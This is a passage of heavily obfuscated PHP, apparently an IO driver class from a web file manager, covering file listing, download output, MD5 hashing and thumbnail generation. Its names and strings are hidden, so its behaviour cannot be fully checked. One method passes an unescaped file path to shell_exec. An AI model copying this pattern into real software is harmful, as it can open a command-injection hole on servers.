$ö¾Ì”ÛË[$ÑÃ¸ã¸¡[83]]); foreach ($üûÒÂãş as $õà«¢¬Ö) { $ÖÊòî¡ = $õà«¢¬Ö[$ÑÃ¸ã¸¡[33]] == $ÑÃ¸ã¸¡[75]; $â©¸³Ë = array($ÑÃ¸ã¸¡[84] => $õà«¢¬Ö[$ÑÃ¸ã¸¡[84]], $ÑÃ¸ã¸¡[75] => $ÖÊòî¡); if (isset($õà«¢¬Ö[$ÑÃ¸ã¸¡[76]])) { $â©¸³Ë[$ÑÃ¸ã¸¡[76]] = $õà«¢¬Ö[$ÑÃ¸ã¸¡[76]]; } if (isset($õà«¢¬Ö[$ÑÃ¸ã¸¡[85]])) { $â©¸³Ë[$ÑÃ¸ã¸¡[85]] = $õà«¢¬Ö[$ÑÃ¸ã¸¡[85]]; } if (!$ÖÊòî¡) { $†Œ†îñ¶[] = $â©¸³Ë; continue; } $†Œ†îñ¶[] = $â©¸³Ë; $Ãõ³Ç´ = $õà«¢¬Ö[$ÑÃ¸ã¸¡[84]]; $Ä¶²æü = $this->pathDriver; if (substr($õà«¢¬Ö[$ÑÃ¸ã¸¡[84]], 0, strlen($Ä¶²æü)) == $Ä¶²æü) { $Ãõ³Ç´ = substr($Ãõ³Ç´, strlen($Ä¶²æü)); } $this->listAllMake($Ãõ³Ç´, $†Œ†îñ¶); } } public function listAllSimple($¥ºÎÍö, $ëçØ³  = false) { $ÅßÌŸ·Ä = $this->listAll($¥ºÎÍö); return $this->listAllSimpleMake($ÅßÌŸ·Ä, $this->getPathOuter($¥ºÎÍö), $ëçØ³ ); } public function listAllSimpleMake($°¾ÄÉ¾, $¬º­°š˜, $‰†±‘Ï‹) { $‘Ãß®òª =& $_SERVER[çâ¥×ø³]; $á®Ì¬úÀ = array(); $¬º­°š˜ = rtrim(get_path_father($¬º­°š˜), $‘Ãß®òª[8]) . $‘Ãß®òª[8]; foreach ($°¾ÄÉ¾ as $¡‘Ğ—Û°) { $œüµµë = array($‘Ãß®òª[84] => $¡‘Ğ—Û°[$‘Ãß®òª[84]], $‘Ãß®òª[86] => $¡‘Ğ—Û°[$‘Ãß®òª[84]], $‘Ãß®òª[75] => $¡‘Ğ—Û°[$‘Ãß®òª[75]]); if (isset($¡‘Ğ—Û°[$‘Ãß®òª[76]]) && !$¡‘Ğ—Û°[$‘Ãß®òª[75]]) { $œüµµë[$‘Ãß®òª[76]] = $¡‘Ğ—Û°[$‘Ãß®òª[76]]; } if (isset($¡‘Ğ—Û°[$‘Ãß®òª[85]])) { $œüµµë[$‘Ãß®òª[85]] = $¡‘Ğ—Û°[$‘Ãß®òª[85]]; } if (is_array($¡‘Ğ—Û°[$‘Ãß®òª[87]])) { $œüµµë[$‘Ãß®òª[86]] = $¡‘Ğ—Û°[$‘Ãß®òª[87]][$‘Ãß®òª[84]]; $œüµµë[$‘Ãß®òª[76]] = $¡‘Ğ—Û°[$‘Ãß®òª[87]][$‘Ãß®òª[76]]; $œüµµë[$‘Ãß®òª[85]] = $¡‘Ğ—Û°[$‘Ãß®òª[87]][$‘Ãß®òª[85]]; } else { if (substr($¡‘Ğ—Û°[$‘Ãß®òª[84]], 0, strlen($¬º­°š˜)) == $¬º­°š˜) { $œüµµë[$‘Ãß®òª[84]] = substr($¡‘Ğ—Û°[$‘Ãß®òª[84]], strlen($¬º­°š˜)); } } $ÁÉşÅ‚ä = $¡‘Ğ—Û°[$‘Ãß®òª[75]] ? $‘Ãß®òª[8] : $‘Ãß®òª[12]; $œüµµë[$‘Ãß®òª[86]] = rtrim($œüµµë[$‘Ãß®òª[86]], $‘Ãß®òª[8]) . $ÁÉşÅ‚ä; $œüµµë[$‘Ãß®òª[84]] = $‘Ãß®òª[8] . trim($œüµµë[$‘Ãß®òª[84]], $‘Ãß®òª[8]) . $ÁÉşÅ‚ä; if (!$‰†±‘Ï‹) { $şˆ™¶Ø« = explode($‘Ãß®òª[8], trim($œüµµë[$‘Ãß®òª[84]], $‘Ãß®òª[8])); $œüµµë[$‘Ãß®òª[84]] = $‘Ãß®òª[8] . implode($‘Ãß®òª[8], array_slice($şˆ™¶Ø«, 1)) . $ÁÉşÅ‚ä; } $á®Ì¬úÀ[] = $œüµµë; } return array_sort_by($á®Ì¬úÀ, $‘Ãß®òª[84]); } public function upload($Õ½±´Î, $À¬ò•ïù, $á¦§„âì = false, $²°¶‚½ü = REPEAT_REPLACE) { } public function uploadFileByID($¯è£”ó, $ÊŒ•›±¨, $Û¡ÍÉ½Õ) { } public function uploadFileByPath($‡­ Ë‰Ï, $€£€²ãÌ, $©—ø–Ãõ = array()) { } public function isUploadServer() { $‹×£şç¬ =& $_SERVER[çâ¥×ø³]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $‹×£şç¬[88]) { return !0; } return $GLOBALS[$‹×£şç¬[6]][$‹×£şç¬[89]][$‹×£şç¬[90]]; } public function isFileOutServer() { $ó‹¾Éù§ =& $_SERVER[çâ¥×ø³]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ó‹¾Éù§[88]) { return !0; } return $GLOBALS[$ó‹¾Éù§[6]][$ó‹¾Éù§[89]][$ó‹¾Éù§[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($Ñ°ÍÎ§¦) { $È¥›·¢á =& $_SERVER[çâ¥×ø³]; if (!$this->isCdnHost()) { return $Ñ°ÍÎ§¦; } return str_replace(trim(get_url_root($Ñ°ÍÎ§¦), $È¥›·¢á[8]), trim($this->cdnHost, $È¥›·¢á[8]), $Ñ°ÍÎ§¦); } public function uploadLink($ Ş™¬•Ê, $™Èé¬¦ï = 0) { $Ú‡ìåÌº =& $_SERVER[çâ¥×ø³]; if ($this->isUploadServer()) { return; } $¬€¼ñËØ = $this->getType(); if (!in_array($¬€¼ñËØ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $«õëı´È = 1024 * 1024 * 10; $ø²ßÙÓº = $™Èé¬¦ï <= $«õëı´È ? $Ú‡ìåÌº[92] : $Ú‡ìåÌº[93]; $€ğ¥½Ù = (!$™Èé¬¦ï ? 1 : ceil($™Èé¬¦ï / pow(1024, 3))) * 3600 * 4; $İ²•ó¥Ö = $this->{$ø²ßÙÓº}($ Ş™¬•Ê, $€ğ¥½Ù); if ($İ²•ó¥Ö) { $İ²•ó¥Ö[$Ú‡ìåÌº[94]] = $ Ş™¬•Ê; $İ²•ó¥Ö[$Ú‡ìåÌº[95]] = $¬€¼ñËØ; } return $İ²•ó¥Ö; } public function uploadFormData($Øè®¡‰², $ëˆ¬ËÍğ = 3600) { } public function multiUploadFormData($£š÷´÷È, $à«·š”Õ = 3600) { } public function download($ÒòÈ”İ, $¦¤—„ü˜) { } public function ext($áğÇè¡í) { $ãÎâ»Ù¥ =& $_SERVER[çâ¥×ø³]; if (strpos($áğÇè¡í, $ãÎâ»Ù¥[8]) === -1) { $¨ï¾µíÌ = $áğÇè¡í; } else { $¨ï¾µíÌ = $this->pathThis($áğÇè¡í); } $’ÍóóÆÉ = $ãÎâ»Ù¥[12]; if (strstr($¨ï¾µíÌ, $ãÎâ»Ù¥[10])) { $’ÍóóÆÉ = substr($¨ï¾µíÌ, strrpos($¨ï¾µíÌ, $ãÎâ»Ù¥[10]) + 1); $’ÍóóÆÉ = strtolower($’ÍóóÆÉ); } if (strlen($’ÍóóÆÉ) > 3 && preg_match($ãÎâ»Ù¥[96], $’ÍóóÆÉ, $‡ıÁÛ™ğ)) { $’ÍóóÆÉ = $ãÎâ»Ù¥[12]; } return $’ÍóóÆÉ; } public function pathThis($²ü²£¨”) { $è“£Ìç =& $_SERVER[çâ¥×ø³]; $²ü²£¨” = str_replace($è“£Ìç[97], $è“£Ìç[8], rtrim($²ü²£¨”, $è“£Ìç[8])); $¾ßÓçÚÁ = strrpos($²ü²£¨”, $è“£Ìç[8]); if ($¾ßÓçÚÁ === !1) { return $²ü²£¨”; } return substr($²ü²£¨”, $¾ßÓçÚÁ + 1); } public function pathFather($€„°ôöä) { $ì¦˜ª¥² =& $_SERVER[çâ¥×ø³]; $€„°ôöä = str_replace($ì¦˜ª¥²[97], $ì¦˜ª¥²[8], rtrim($€„°ôöä, $ì¦˜ª¥²[8])); $ÉƒîöÕ = strrpos($€„°ôöä, $ì¦˜ª¥²[8]); if ($ÉƒîöÕ === !1) { return $ì¦˜ª¥²[12]; } return substr($€„°ôöä, 0, $ÉƒîöÕ + 1); } public function hashSimple($šõñ¢Ïƒ) { $¾÷©ı¹å =& $_SERVER[çâ¥×ø³]; if (!$šõñ¢Ïƒ) { return md5($¾÷©ı¹å[12]); } $Ëàì·Ñ³ = $this->size($šõñ¢Ïƒ); $Ÿ¿»¿ûê = 200; $êÔã¦Á‰ = 50; if ($Ëàì·Ñ³ <= $Ÿ¿»¿ûê * $êÔã¦Á‰) { return $this->hashMd5($šõñ¢Ïƒ) . $Ëàì·Ñ³; } $¨ÛµÂ” = intval($Ëàì·Ñ³ / $êÔã¦Á‰); $—¥ü»Û¥ = $¾÷©ı¹å[12]; for ($–ö¿ŠÍÌ = 0; $–ö¿ŠÍÌ < $êÔã¦Á‰; $–ö¿ŠÍÌ++) { $—¥ü»Û¥ .= $this->fileSubstr($šõñ¢Ïƒ, $¨ÛµÂ” * $–ö¿ŠÍÌ, $Ÿ¿»¿ûê); } $—¥ü»Û¥ .= $this->fileSubstr($šõñ¢Ïƒ, $Ëàì·Ñ³ - $Ÿ¿»¿ûê, $Ÿ¿»¿ûê); return md5($—¥ü»Û¥) . $Ëàì·Ñ³; } public static $md5Cache = array(); public function hashMd5($õĞúå«) { if (!$õĞúå«) { return md5($_SERVER[çâ¥×ø³][12]); } $õĞúå« = $this->iconvSystem($õĞúå«); if (isset(self::$md5Cache[$õĞúå«])) { return self::$md5Cache[$õĞúå«]; } self::$md5Cache[$õĞúå«] = $this->hashMd5Shell($õĞúå«); if (!self::$md5Cache[$õĞúå«]) { self::$md5Cache[$õĞúå«] = @md5_file($õĞúå«); } return self::$md5Cache[$õĞúå«]; } private function hashMd5Shell($Óé®®¦£) { $å½Ò”ÔÍ =& $_SERVER[çâ¥×ø³]; if (!$Óé®®¦£) { return md5($å½Ò”ÔÍ[12]); } if (!function_exists($å½Ò”ÔÍ[98])) { return !1; } $¥íó¿Ñ‰ = array($å½Ò”ÔÍ[99], $å½Ò”ÔÍ[100]); $•ŸÃ–® = Cache::get($å½Ò”ÔÍ[101]); if (!$•ŸÃ–®) { $ü—…½»Ô = BASIC_PATH . $å½Ò”ÔÍ[102]; $®ŒŸ¨öè = md5_file($ü—…½»Ô); $•ŸÃ–® = $å½Ò”ÔÍ[103]; foreach ($¥íó¿Ñ‰ as $²¦»»€) { $éÇÇû­Ü = shell_exec($²¦»»€ . "\40\x22{$ü—…½»Ô}\42"); if ($éÇÇû­Ü && substr(trim($éÇÇû­Ü), 0, 32) == $®ŒŸ¨öè) { $•ŸÃ–® = $²¦»»€; break; } } Cache::set($å½Ò”ÔÍ[101], $•ŸÃ–®, 3600); } if ($•ŸÃ–® == $å½Ò”ÔÍ[103]) { return !1; } $éÇÇû­Ü = shell_exec($•ŸÃ–® . "\x20\42{$Óé®®¦£}\x22"); $éÇÇû­Ü = str_replace($å½Ò”ÔÍ[104], $å½Ò”ÔÍ[12], $éÇÇû­Ü); return substr($éÇÇû­Ü, 0, 32); } public function link($ó‰ëÌ‡Ê) { return $ó‰ëÌ‡Ê; } public function fileOut($²İ´Ûñ¢, $¨¤Û·‘Ù = false, $…—§Ü¿ò = false, $‹ş’ê¿¨ = '') { $Ö³Ñ¡®Ğ =& $_SERVER[çâ¥×ø³]; $this->cacheMethod(null, null); if (!$²İ´Ûñ¢ || !$this->exist($²İ´Ûñ¢)) { show_json(LNG($Ö³Ñ¡®Ğ[105]), !1, $…—§Ü¿ò); } $ÁûòÊÙ = $this->getType() == $Ö³Ñ¡®Ğ[106]; $ìıº£È£ = $GLOBALS[$Ö³Ñ¡®Ğ[6]][$Ö³Ñ¡®Ğ[89]][$Ö³Ñ¡®Ğ[107]][$Ö³Ñ¡®Ğ[108]]; $Ìæ‰ğÁ± = (double) $GLOBALS[$Ö³Ñ¡®Ğ[6]][$Ö³Ñ¡®Ğ[89]][$Ö³Ñ¡®Ğ[107]][$Ö³Ñ¡®Ğ[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $–¥èºÇÒ = $this->infoFull($²İ´Ûñ¢); $Ñúâ´ú» = $–¥èºÇÒ[$Ö³Ñ¡®Ğ[76]]; $†æÂáÕä = gmdate($Ö³Ñ¡®Ğ[110], $–¥èºÇÒ[$Ö³Ñ¡®Ğ[85]]); $îõÄ“™ = $…—§Ü¿ò ? $…—§Ü¿ò : $this->iconvApp($–¥èºÇÒ[$Ö³Ñ¡®Ğ[32]]); $ä«¨ÊúÛ = 0; $ĞòÂˆƒ = $Ñúâ´ú» - 1; $”óèÇÓ‡ = $this->ext($îõÄ“™); if (in_array($”óèÇÓ‡, array($Ö³Ñ¡®Ğ[111], $Ö³Ñ¡®Ğ[112], $Ö³Ñ¡®Ğ[113], $Ö³Ñ¡®Ğ[114]))) { $”óèÇÓ‡ = $Ö³Ñ¡®Ğ[115]; } if (in_array($”óèÇÓ‡, array($Ö³Ñ¡®Ğ[116]))) { $”óèÇÓ‡ = $Ö³Ñ¡®Ğ[117]; } if (!$‹ş’ê¿¨) { $‹ş’ê¿¨ = md5($†æÂáÕä . $Ñúâ´ú»); } $‹ş’ê¿¨ = $Ö³Ñ¡®Ğ[118] . $‹ş’ê¿¨ . $Ö³Ñ¡®Ğ[118]; $å¼¢€ñû = get_file_mime($”óèÇÓ‡); $‰àë‰¼Ş = !0; $‰àë‰¼Ş = isset($_GET[$Ö³Ñ¡®Ğ[119]]) ? !1 : !0; if ($¨¤Û·‘Ù === !1 && !mime_support($å¼¢€ñû)) { $å¼¢€ñû = $Ö³Ñ¡®Ğ[120]; } header($Ö³Ñ¡®Ğ[121]); header($Ö³Ñ¡®Ğ[122] . $å¼¢€ñû); $°åı½ = rawurlencode($îõÄ“™); $°åı½ = $Ö³Ñ¡®Ğ[118] . $°åı½ . $Ö³Ñ¡®Ğ[123] . $°åı½; if ($¨¤Û·‘Ù) { header($Ö³Ñ¡®Ğ[124]); header($Ö³Ñ¡®Ğ[125] . $°åı½); } else { if ($‰àë‰¼Ş) { header($Ö³Ñ¡®Ğ[126] . $°åı½); } } header($Ö³Ñ¡®Ğ[127] . gmdate($Ö³Ñ¡®Ğ[110], time() + 3600 * 24 * 30) . $Ö³Ñ¡®Ğ[128]); header($Ö³Ñ¡®Ğ[129]); header($Ö³Ñ¡®Ğ[130]); header($Ö³Ñ¡®Ğ[131]); if (isset($_SERVER[$Ö³Ñ¡®Ğ[132]]) && strtotime($_SERVER[$Ö³Ñ¡®Ğ[132]]) == $–¥èºÇÒ[$Ö³Ñ¡®Ğ[85]]) { header($Ö³Ñ¡®Ğ[133], !0, 304); die; } if (isset($_SERVER[$Ö³Ñ¡®Ğ[134]]) && $_SERVER[$Ö³Ñ¡®Ğ[134]] == $‹ş’ê¿¨) { header($Ö³Ñ¡®Ğ[135] . $‹ş’ê¿¨, !0, 304); die; } header($Ö³Ñ¡®Ğ[135] . $‹ş’ê¿¨); header($Ö³Ñ¡®Ğ[136] . $†æÂáÕä . $Ö³Ñ¡®Ğ[128]); header($Ö³Ñ¡®Ğ[137] . $îõÄ“™); header($Ö³Ñ¡®Ğ[138]); header($Ö³Ñ¡®Ğ[139] . $Ñúâ´ú»); header($Ö³Ñ¡®Ğ[140]); Hook::trigger($Ö³Ñ¡®Ğ[141], $²İ´Ûñ¢, $Ñúâ´ú», $îõÄ“™, $”óèÇÓ‡); if (!$¨¤Û·‘Ù && $”óèÇÓ‡ == $Ö³Ñ¡®Ğ[142]) { if ($Ñúâ´ú» > 1024 * 1024 * 5) { die; } $²ùú¦Òğ = $this->getContent($²İ´Ûñ¢); $²ùú¦Òğ = Html::clearSVG($²ùú¦Òğ); header($Ö³Ñ¡®Ğ[143] . strlen($²ùú¦Òğ)); echo $²ùú¦Òğ; die; } $Ø¬ëö = strtolower($_SERVER[$Ö³Ñ¡®Ğ[144]]); if ($ÁûòÊÙ && $Ø¬ëö && $ìıº£È£) { if (strstr($Ø¬ëö, $Ö³Ñ¡®Ğ[145])) { header($Ö³Ñ¡®Ğ[146] . $²İ´Ûñ¢); } else { if (strstr($Ø¬ëö, $Ö³Ñ¡®Ğ[147])) { header($Ö³Ñ¡®Ğ[148] . $²İ´Ûñ¢); } else { if (strstr($Ø¬ëö, $Ö³Ñ¡®Ğ[149])) { header($Ö³Ñ¡®Ğ[150] . $²İ´Ûñ¢); } } } if ($Ìæ‰ğÁ±) { header($Ö³Ñ¡®Ğ[151] . $Ìæ‰ğÁ±); } return; } if (isset($_SERVER[$Ö³Ñ¡®Ğ[152]])) { if (preg_match($Ö³Ñ¡®Ğ[153], $_SERVER[$Ö³Ñ¡®Ğ[152]], $ì˜å§•õ)) { $ä«¨ÊúÛ = intval($ì˜å§•õ[1]); $ä«¨ÊúÛ = $ä«¨ÊúÛ <= 0 ? 0 : ($ä«¨ÊúÛ >= $ĞòÂˆƒ ? $ĞòÂˆƒ : $ä«¨ÊúÛ); if (!empty($ì˜å§•õ[2])) { $»şÆôÙÜ = intval($ì˜å§•õ[2]); $ĞòÂˆƒ = $»şÆôÙÜ < $ä«¨ÊúÛ ? $ä«¨ÊúÛ : ($»şÆôÙÜ >= $ĞòÂˆƒ ? $ĞòÂˆƒ : $»şÆôÙÜ); } } header($Ö³Ñ¡®Ğ[154]); header("\103\x6f\x6e\164\x65\x6e\164\55\x52\141\156\147\x65\72\x20\142\x79\x74\145\x73\40{$ä«¨ÊúÛ}\x2d{$ĞòÂˆƒ}\57" . $Ñúâ´ú»); } else { header($Ö³Ñ¡®Ğ[155]); } header($Ö³Ñ¡®Ğ[156]); $¯—äóóê = !0; if ($_SERVER[$Ö³Ñ¡®Ğ[157]] == $Ö³Ñ¡®Ğ[158] && $Ñúâ´ú» > 1204 * 1024 * 1024 * 2) { $¯—äóóê = !1; } if ($¯—äóóê) { header($Ö³Ñ¡®Ğ[159] . ($ĞòÂˆƒ - $ä«¨ÊúÛ + 1)); } if ($_SERVER[$Ö³Ñ¡®Ğ[160]] == $Ö³Ñ¡®Ğ[161]) { return; } $ì¾€ùØ¸ = 1024 * 100; $ğ ˜‰åç = 0; if ($Ìæ‰ğÁ±) { $ğ ˜‰åç = intval(1000 * 1000 * ($ì¾€ùØ¸ / $Ìæ‰ğÁ±)); } while ($ä«¨ÊúÛ <= $ĞòÂˆƒ) { $ìØá¢Ç¥ = timeFloat(); check_abort(); $›„¾´•Ş = $ĞòÂˆƒ - $ä«¨ÊúÛ + 1; if ($›„¾´•Ş <= $ì¾€ùØ¸) { $ì¾€ùØ¸ = $›„¾´•Ş; } echo $this->fileSubstr($²İ´Ûñ¢, $ä«¨ÊúÛ, $ì¾€ùØ¸); $ä«¨ÊúÛ += $ì¾€ùØ¸; if ($ì¾€ùØ¸ == $›„¾´•Ş) { $ä«¨ÊúÛ = $ĞòÂˆƒ + 1; } if ($ğ ˜‰åç) { $šì–ÑŞ¬ = intval(1000 * 1000 * (timeFloat() - $ìØá¢Ç¥)); $Ú¤˜’·€ = $ğ ˜‰åç - $šì–ÑŞ¬; if ($Ú¤˜’·€ > 5) { usleep($Ú¤˜’·€); } } } } public function fileOutServer($á„’Ÿ¥¾, $¨³‹×ˆÁ = false, $”Şå«å– = false, $ÇãØ¶¹ = '') { $this->fileOut($á„’Ÿ¥¾, $¨³‹×ˆÁ, $”Şå«å–, $ÇãØ¶¹); } public function fileOutLink($Ã«ÃßÏ¦) { header($_SERVER[çâ¥×ø³][162] . $Ã«ÃßÏ¦); die; } public function cacheMethod($¼Ëïášª, $ˆ´ÂüÆ, $î¾İ£À = null) { $Î±÷å†İ =& $_SERVER[çâ¥×ø³]; static $°ƒ™åş² = array(); $Ë‡ãØµ€ = $ˆ´ÂüÆ ? ltrim($this->getPathOuter($ˆ´ÂüÆ), $Î±÷å†İ[8]) : $Î±÷å†İ[12]; $É”ãÍìª = $Î±÷å†İ[163] . $¼Ëïášª . $Î±÷å†İ[164] . rtrim($Ë‡ãØµ€, $Î±÷å†İ[8]); if (is_null($¼Ëïášª)) { $°ƒ™åş² = array(); return; } if (is_null($ˆ´ÂüÆ)) { foreach ($°ƒ™åş² as $É”ãÍìª => $¨ŸŸÛ‰) { if (!strstr($É”ãÍìª, $Î±÷å†İ[163] . $¼Ëïášª . $Î±÷å†İ[165])) { continue; } unset($°ƒ™åş²[$É”ãÍìª]); } return; } if (!is_null($î¾İ£À)) { $°ƒ™åş²[$É”ãÍìª] = $î¾İ£À; return; } $ö¡½Ø‚ = isset($°ƒ™åş²[$É”ãÍìª]) ? $°ƒ™åş²[$É”ãÍìª] : null; if (!is_null($ö¡½Ø‚)) { return $ö¡½Ø‚; } $ö¡½Ø‚ = $this->{$¼Ëïášª}($ˆ´ÂüÆ); $°ƒ™åş²[$É”ãÍìª] = $ö¡½Ø‚; return $ö¡½Ø‚; } public function cacheMethodInfoSet($‚Ñíö­, $¦àÂ¯È , $ ×ñŸ€õ = false) { $¤ı€íû› =& $_SERVER[çâ¥×ø³]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($¤ı€íû›[166], $‚Ñíö­, $¦àÂ¯È ); $this->cacheMethod($¤ı€íû›[167], $‚Ñíö­, $¦àÂ¯È  ? !1 : !0); if (is_array($ ×ñŸ€õ)) { $this->cacheMethod($¤ı€íû›[168], $‚Ñíö­, $ ×ñŸ€õ); } } public function fileOutImage($àÅíó€Ñ, $ô¢Î±ı = 250) { $¢Á´©øù =& $_SERVER[çâ¥×ø³]; set_timeout(); if (substr($àÅíó€Ñ, 0, 4) == $¢Á´©øù[149]) { $this->fileOutLink($àÅíó€Ñ); } $ñòŸ€ü÷ = $this->info($àÅíó€Ñ); $³ÎÕ¥•Ş = !1; $ ’Ãò = isset($GLOBALS[$¢Á´©øù[169]]) ? $GLOBALS[$¢Á´©øù[169]] : array(); if ($ ’Ãò && $ ’Ãò[$¢Á´©øù[170]] == $ñòŸ€ü÷[$¢Á´©øù[84]]) { $ñòŸ€ü÷ = $ ’Ãò; $Í³ĞêÄà = $ñòŸ€ü÷[$¢Á´©øù[171]]; if ($Í³ĞêÄà && isset($Í³ĞêÄà[$¢Á´©øù[172]])) { if ($Í³ĞêÄà[$¢Á´©øù[172]] <= $ô¢Î±ı && $Í³ĞêÄà[$¢Á´©øù[173]] <= $ô¢Î±ı) { $³ÎÕ¥•Ş = !0; } } } if ($ñòŸ€ü÷[$¢Á´©øù[76]] <= 1024 * 50 || $³ÎÕ¥•Ş || !function_exists($¢Á´©øù[174]) || $ñòŸ€ü÷[$¢Á´©øù[175]] == $¢Á´©øù[176]) { return $this->fileOut($àÅíó€Ñ, !1, $ñòŸ€ü÷[$¢Á´©øù[32]]); } $¬£Á”À = kodIO::hashPath($ñòŸ€ü÷); $Ï×ƒ“ë = "\143\157\x76\145\162\137{$¬£Á”À}\x5f{$ô¢Î±ı}\56\x70\x6e\147"; $¬Ş×µ¡ö = IO_PATH_SYSTEM_TEMP . $¢Á´©øù[177]; $ˆ„Î±Œ’ = IO::infoFullSimple($¬Ş×µ¡ö); $„¡´ÛÛÍ = $ˆ„Î±Œ’ && is_array($ˆ„Î±Œ’) ? $ˆ„Î±Œ’[$¢Á´©øù[84]] : $¢Á´©øù[12]; if (!$„¡´ÛÛÍ) { $„¡´ÛÛÍ = IO::mkdir($¬Ş×µ¡ö); } if ($ñòŸ€ü÷[$¢Á´©øù[178]] == $¢Á´©øù[179] && isset($ñòŸ€ü÷[$¢Á´©øù[180]]) && $ñòŸ€ü÷[$¢Á´©øù[180]] == kodIO::sourceID($„¡´ÛÛÍ)) { $ø›¨›ç = $ñòŸ€ü÷[$¢Á´©øù[181]]; if ($ô¢Î±ı <= 500) { $şÎÔ¸À = preg_replace($¢Á´©øù[182], $¢Á´©øù[183], $ñòŸ€ü÷[$¢Á´©øù[32]]); $ø›¨›ç = IO::fileNameExist($„¡´ÛÛÍ, $şÎÔ¸À); } return IO::fileOut(KodIO::make($ø›¨›ç), !1, $ñòŸ€ü÷[$¢Á´©øù[32]]); } $î‡ƒ•Ì† = IO::fileNameExist($„¡´ÛÛÍ, $Ï×ƒ“ë); if ($î‡ƒ•Ì†) { return IO::fileOut(KodIO::make($î‡ƒ•Ì†), !1, $ñòŸ€ü÷[$¢Á´©øù[32]]); } if ($ô¢Î±ı > 1000) { $this->makeImageCover($„¡´ÛÛÍ, $àÅíó€Ñ, $Ï×ƒ“ë, $ô¢Î±ı); $this->makeImageCover($„¡´ÛÛÍ, $àÅíó€Ñ, "\143\157\166\x65\x72\x5f{$¬£Á”À}\137\x32\x35\x30\56\160\156\x67", 250); $î‡ƒ•Ì† = IO::fileNameExist($„¡´ÛÛÍ, $Ï×ƒ“ë); if ($î‡ƒ•Ì†) { return IO::fileOut(KodIO::make($î‡ƒ•Ì†), !1, $ñòŸ€ü÷[$¢Á´©øù[32]]); } die; } $‡²¾‹ = Cache::get($Ï×ƒ“ë); if ($‡²¾‹ == $¢Á´©øù[184] || $‡²¾‹ == $¢Á´©øù[185]) { echo $‡²¾‹; die; } Cache::set($Ï×ƒ“ë, $¢Á´©øù[185], 60); $í®œ°¤¯ = array($„¡´ÛÛÍ, $ñòŸ€ü÷[$¢Á´©øù[84]], $Ï×ƒ“ë, $ô¢Î±ı); $ëÓÇì¼˜ = $¢Á´©øù[186] . $ñòŸ€ü÷[$¢Á´©øù[76]] . $¢Á´©øù[187] . $Ï×ƒ“ë . $¢Á´©øù[188] . $ñòŸ€ü÷[$¢Á´©øù[32]] . $¢Á´©øù[189] . $ñòŸ€ü÷[$¢Á´©øù[84]]; TaskQueue::add($¢Á´©øù[190], $í®œ°¤¯, $ëÓÇì¼˜, $Ï×ƒ“ë); } public function makeImageCover($¸Ä¿ÜäÃ, $Ï§±×İŠ, $€„íÏ”ö, $ÁÑÊòĞö) { $‰Ç›ÍÊ =& $_SERVER[çâ¥×ø³]; if (IO::fileNameExist($¸Ä¿ÜäÃ, $€„íÏ”ö)) { return $‰Ç›ÍÊ[191]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ñ—Ÿëé = DATA_THUMB . $€„íÏ”ö; del_file($ñ—Ÿëé); $åÒ™Ì£ = TEMP_FILES . $€„íÏ”ö; if (!@file_exists($åÒ™Ì£)) { $åÒ™Ì£ = IO::download($Ï§±×İŠ, $åÒ™Ì£); } if (!@file_exists($åÒ™Ì£)) { return $‰Ç›ÍÊ[192]; } ImageThumb::createThumb($åÒ™Ì£, $ñ—Ÿëé, $ÁÑÊòĞö, $ÁÑÊòĞö * 10); if (@file_exists($ñ—Ÿëé)) { Cache::remove($€„íÏ”ö); return IO::move($ñ—Ÿëé, $¸Ä¿ÜäÃ); } Cache::set($€„íÏ”ö, $‰Ç›ÍÊ[184], 600); del_file($ñ—Ÿëé); return $‰Ç›ÍÊ[193] . $åÒ™Ì£ . $‰Ç›ÍÊ[71]; } public function fileOutImageServer($ö«Î¤Æ¼, $Ûó¿ÉŒ« = 250) { $this->fileOutImage($ö«Î¤Æ¼, $Ûó¿ÉŒ«); } public function fileNameAuto($ø¯ºÓÔÆ, $„£’°, $„à‹Èñ” = REPEAT_RENAME, $„’ß†—š = false) { $Ùúº¯³Ü =& $_SERVER[çâ¥×ø³]; $òÙøƒŸ„ = $ø¯ºÓÔÆ === $Ùúº¯³Ü[12] ? $„£’° : rtrim($ø¯ºÓÔÆ, $Ùúº¯³Ü[8]) . $Ùúº¯³Ü[8] . $„£’°; if ($„à‹Èñ” == REPEAT_REPLACE || !$this->exist($òÙøƒŸ„) || $„’ß†—š && $„à‹Èñ” != REPEAT_RENAME_FOLDER) { return $„£’°; } if ($„à‹Èñ” == REPEAT_SKIP) { return !1; } $åÔ‘×‡ó = $Ùúº¯³Ü[10] . get_path_ext($„£’°); $åÔ‘×‡ó = $åÔ‘×‡ó == $Ùúº¯³Ü[10] || $„’ß†—š ? $Ùúº¯³Ü[12] : $åÔ‘×‡ó; $´’¸¯® = 1; $…Öæ¡‚ø = substr($„£’°, 0, strlen($„£’°) - strlen($åÔ‘×‡ó)); $‹©ëû»¿ = $…Öæ¡‚ø . "\50{$´’¸¯®}\x29{$åÔ‘×‡ó}"; while ($this->exist(rtrim($ø¯ºÓÔÆ, $Ùúº¯³Ü[8]) . $Ùúº¯³Ü[8] . $‹©ëû»¿)) { $‹©ëû»¿ = $…Öæ¡‚ø . "\x28{$´’¸¯®}\51{$åÔ‘×‡ó}"; $´’¸¯®++; } return $‹©ëû»¿; } private function fileNameAutoList($¥¦Ğ‰Œà, $Îèñ¾”Ç, $ôåâï´ = false) { $ê ÈëÖ =& $_SERVER[çâ¥×ø³]; $ÊÕ¿°€ = $this->listPath($¥¦Ğ‰Œà, !0); $ÊÕ¿°€ = array_merge($ÊÕ¿°€[$ê ÈëÖ[82]], $ÊÕ¿°€[$ê ÈëÖ[83]]); $ÛÍİşŞò = array_to_keyvalue($ÊÕ¿°€, $ê ÈëÖ[12], $ê ÈëÖ[32]); $Ñ¼™°ı£ = $ê ÈëÖ[10] . get_path_ext($Îèñ¾”Ç); $Ñ¼™°ı£ = $Ñ¼™°ı£ == $ê ÈëÖ[10] || $ôåâï´ ? $ê ÈëÖ[12] : $Ñ¼™°ı£; $„µ’´‰ = substr($Îèñ¾”Ç, 0, strlen($Îèñ¾”Ç) - strlen($Ñ¼™°ı£)); $‰Ó²èì½ = $„µ’´‰ . 